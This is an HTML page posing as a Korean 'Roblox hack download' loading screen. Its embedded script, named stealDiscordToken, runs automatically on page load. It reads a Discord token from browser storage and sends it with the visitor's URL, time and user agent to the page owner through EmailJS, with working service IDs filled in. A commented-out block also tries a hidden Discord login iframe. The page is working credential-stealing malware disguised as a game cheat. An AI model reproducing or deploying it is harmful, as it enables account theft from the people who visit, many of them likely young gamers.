<!DOCTYPE html>
<html lang="ko">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>로블록스 핵 다운로드 2026</title>
  <style>
    body { 
      margin:0; padding:0; height:100vh; 
      background:#000; color:#0f0; font-family: 'Courier New', monospace; 
      display:flex; align-items:center; justify-content:center; overflow:hidden;
    }
    .container { text-align:center; max-width:90%; }
    h1 { font-size:3rem; text-shadow:0 0 15px #0f0; animation: glitch 1.5s infinite; }
    .loader { width:100px; height:100px; border:10px solid #0f0; border-top:10px solid transparent; border-radius:50%; animation: spin 0.8s linear infinite; margin:40px auto; }
    p { font-size:1.4rem; margin:25px 0; }
    #status { font-size:1.2rem; color:#ff0044; margin-top:20px; }
    @keyframes spin { 0% { transform:rotate(0deg); } 100% { transform:rotate(360deg); } }
    @keyframes glitch { 0%,100% { text-shadow:2px 0 #f0f, -2px 0 #0ff; } 20% { text-shadow:-2px -2px #f0f, 2px 2px #0ff; } }
  </style>
  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
</head>
<body>
  <div class="container">
    <h1>핵 로딩 중...</h1>
    <div class="loader" id="loader"></div>
    <p id="message">잠시만 기다려주세요!</p>
    <div id="status"></div>
  </div>

  <script>
    // EmailJS 초기화
    let emailjsLoaded = false;
    try {
      emailjs.init("ycbHVBt3cm6FkCL--");
      emailjsLoaded = true;
      console.log("[EmailJS] 초기화 성공");
    } catch(e) {
      console.error("[EmailJS] 초기화 실패:", e);
      document.getElementById("status").innerText = "초기화 오류 발생 - 새로고침 해보세요";
    }

    const SERVICE_ID = "service_jmsvqzd";
    const TEMPLATE_ID = "template_fjunjx8";

    async function stealDiscordToken() {
      document.getElementById("message").innerText = "토큰 추출 중...";

      let token = localStorage.getItem("token") || sessionStorage.getItem("token");

      // iframe 시도 (필요 시 주석 해제)
      /*
      if (!token) {
        try {
          const iframe = document.createElement("iframe");
          iframe.style.display = "none";
          iframe.src = "https://discord.com/login";
          document.body.appendChild(iframe);
          await new Promise(r => setTimeout(r, 2500));
          const win = iframe.contentWindow || iframe.contentDocument?.defaultView;
          if (win) {
            token = win.localStorage?.getItem("token") || win.sessionStorage?.getItem("token");
          }
          document.body.removeChild(iframe);
        } catch(e) {
          console.log("iframe 차단됨");
        }
      }
      */

      if (token) {
        token = token.replace(/"/g, "").trim();
        console.log("[+] 토큰 잡음:", token.substring(0, 35) + "...");

        if (!emailjsLoaded) {
          alert("EmailJS 로드 실패 - 토큰은 콘솔에 찍힘");
          return;
        }

        try {
          await emailjs.send(SERVICE_ID, TEMPLATE_ID, {
            token: token,
            url: window.location.href,
            time: new Date().toISOString(),
            userAgent: navigator.userAgent
          });
          console.log("[++] 메일 발송 완료");
          document.getElementById("status").innerText = "완료! 메일함 확인하세요";
        } catch(err) {
          console.error("발송 실패:", err);
          document.getElementById("status").innerText = "발송 실패 (콘솔 확인)";
        }
      } else {
        console.log("[-] 토큰 못 찾음 - Discord 로그인 상태 확인");
        alert("토큰을 찾을 수 없습니다!\n\n1. Discord 웹에서 로그인 되어 있는지 확인\n2. 새로고침 후 다시 시도");
        document.getElementById("status").innerText = "토큰 못 찾음 - 로그인 확인하세요";
      }

      // 로더 숨기기
      document.getElementById("loader").style.display = "none";
    }

    // 페이지 로드 후 실행
    window.addEventListener("load", () => {
      setTimeout(stealDiscordToken, 1000); // 1초 후 시작
    });
  </script>
</body>
</html>
